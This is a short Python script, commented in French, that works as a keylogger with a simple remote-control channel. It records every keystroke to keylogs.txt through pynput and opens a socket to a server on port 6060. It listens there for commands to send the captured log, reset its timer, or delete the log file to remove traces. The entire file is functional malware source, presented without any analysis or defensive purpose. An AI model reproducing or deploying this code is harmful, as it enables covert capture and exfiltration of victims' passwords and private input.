import socket
import os
import time
import threading
from pynput.keyboard import Key, Listener
import logging


message = ""

fin = False
def recep(s):
    global message 
    while message != 'kill':
        message = s.recv(4096)
        message = message.decode('utf-8')
        print("message recu ",message)


def on_press(key):
    logging.info(str(key))
 
def tracing(): 
    if not fin:
        logging.basicConfig(filename=("keylogs.txt"),filemode='w' ,
                            format='%(asctime)s: %(levelname)s: %(message)s',level=logging.DEBUG)

        Listener(on_press=on_press).start()

def send_file(filename,s):
    with open(filename, 'rb') as file:
        file_data = file.read()

        s.sendall(file_data)

def minuteur(dead, filename):
    global fin
    global message
    condition = True
    i = 0
    while condition :
        if message == "kill" :
            try:
                condition = False
                os.remove(filename)
                print(f"Fichier '{filename}' supprimé avec succès.")
            except Exception as e:
                print(f"Erreur lors de la suppression du fichier '{filename}': {e}")
            break
        elif i == dead:
            break
        else:
            print(i)
            time.sleep(3)
            i+=1
            if message == "send":
                send_file(filename, s)
            if message == "re":
                i = 0
                message = ""
            
        # a = input("press 'a' pour redemarer le minuteur")
        # if a == 'a':
        #     i=0
        # elif a =='b':
        #     fin = True
        #     break
   
    


filename = "keylogs.txt" 
server_address = "localhost"  # Adresse IP du serveur
server_port = 6060  # Port du serveur
message = ""
log = threading.Thread(target=tracing,daemon=True)
log.start()
s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.connect((socket.gethostname(),6060))

ordre = threading.Thread(target=recep,args=[s],daemon=True)
ordre.start()

minuteur(10,filename)
send_file(filename, s)
#os.remove(filename)
fin = True
